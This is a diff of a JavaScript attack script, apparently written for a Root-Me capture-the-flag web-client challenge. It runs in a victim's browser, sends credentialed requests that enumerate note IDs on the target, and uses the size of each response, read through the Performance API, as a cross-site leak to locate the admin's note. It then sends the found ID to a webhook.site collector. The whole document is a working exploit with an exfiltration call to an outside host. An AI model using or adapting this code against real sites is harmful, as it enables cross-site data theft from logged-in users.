@@ -6,26 +6,42 @@ const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const START_ID = 1382;
 const MAX_ID = 10000;
+const THRESHOLD = 1000;      // Adjust based on observed admin note size
+const DELAY_MS = 200;        // Delay between requests
 
 let current = START_ID;
 let active = false;
-    
-async function tryId(id) {
-  try {
-    const response = await fetch(TARGET + id, { mode: 'no-cors', credentials: 'include' });
-    
-    if (!response.ok) {
-      console.log(`HTTP error: ${response.status}`);
-      tryId(id+1);
-    }
-    
-    const bodyText = await response.text();
-    
-    console.log(bodyText);
-  } catch (error) {
-    console.error("Fetch failed:", error);
-      tryId(id+1);
-  }
+let found = false;
+
+function tryId(id) {
+    if (active || found) return;
+    active = true;
+
+    // Add cache buster to get fresh response
+    const url = TARGET + id + "?cb=" + Date.now();
+    fetch(url, { mode: 'no-cors', credentials: 'include' });
+
+    setTimeout(() => {
+        const entries = performance.getEntriesByName(url);
+        let size = 0;
+        if (entries.length > 0) {
+            size = entries[0].transferSize;
+            performance.clearResourceTimings();
+        }
+
+        console.log(`ID ${id}: transferSize = ${size}`);
+
+        if (size > THRESHOLD) {
+            found = true;
+            // Exfiltrate the found ID
+            fetch(WEBHOOK + "?admin_note=" + id, { mode: 'no-cors' });
+            console.log("Admin note found at ID", id);
+            return; // Stop scanning
+        }
+
+        active = false;
+        if (id < MAX_ID && !found) setTimeout(() => tryId(id + 1), DELAY_MS);
+    }, DELAY_MS);
 }
 
 tryId(current);
